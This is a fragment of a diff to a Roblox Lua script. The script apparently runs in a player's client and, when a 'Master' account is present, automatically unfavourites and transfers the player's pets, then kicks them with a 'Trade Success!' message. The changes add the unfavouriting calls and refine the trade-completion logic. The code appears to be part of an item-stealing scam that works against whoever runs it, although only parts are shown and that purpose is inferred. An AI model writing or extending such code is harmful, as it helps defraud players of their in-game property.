@@ -106,7 +106,8 @@ task.spawn(function()
                                 print("Found Master Active!")
                                 is_active = true
                                 _G.Is_Trade = true
-                                while true do task.wait(1)
+                                while true do task.wait(.7)
+                                    local x, y = ownerPet()
                                     for _, v in pairs(workspace.PetsPhysical:GetChildren()) do
                                         if v then
                                             local owner = v:GetAttribute('OWNER') 
@@ -133,23 +134,33 @@ task.spawn(function()
                                             end
                                         end
                                     end
-                                    task.wait(1)
+                                    task.wait(2)
                                     local toolequip                                                                 
                                     for _, tool in pairs(player.LocalPlayer.Backpack:GetChildren()) do
                                         if tool:GetAttribute("ItemType") == "Pet" then
                                             local namepet = tool.Name:gsub("%s%[.*", "")
                                             if namepet == y then
+                                                if tool:GetAttribute("d") == true then
+                                                    local args = {
+                                                        tool
+                                                    }
+                                                    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(unpack(args))
+                                                end
                                                 toolequip = tool.Name
                                             end
                                         end
                                     end
-                                    if not toolequip then
-                                        for _, tool in pairs(player.LocalPlayer.Character:GetChildren()) do
-                                            if tool:GetAttribute("ItemType") == "Pet" then
-                                                local namepet = tool.Name:gsub("%s%[.*", "")
-                                                if namepet == y then
-                                                    toolequip = tool.Name
+                                    for _, tool in pairs(player.LocalPlayer.Character:GetChildren()) do
+                                        if tool:GetAttribute("ItemType") == "Pet" then
+                                            local namepet = tool.Name:gsub("%s%[.*", "")
+                                            if namepet == y then
+                                                if tool:GetAttribute("d") == true then
+                                                    local args = {
+                                                        tool
+                                                    }
+                                                    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(unpack(args))
                                                 end
+                                                toolequip = tool.Name
                                             end
                                         end
                                     end
@@ -179,7 +190,8 @@ task.spawn(function()
                                         end
                                     elseif toolequip and not game.Players:FindFirstChild(x) then
                                         print("Not Found Master Active! [2]")
-                                    else
+                                        _timeout = false                                        
+                                    elseif not y and not toolequip then
                                         print("Trade Success!")
                                         wait(5)
                                         player.LocalPlayer:Kick("Trade Success!")
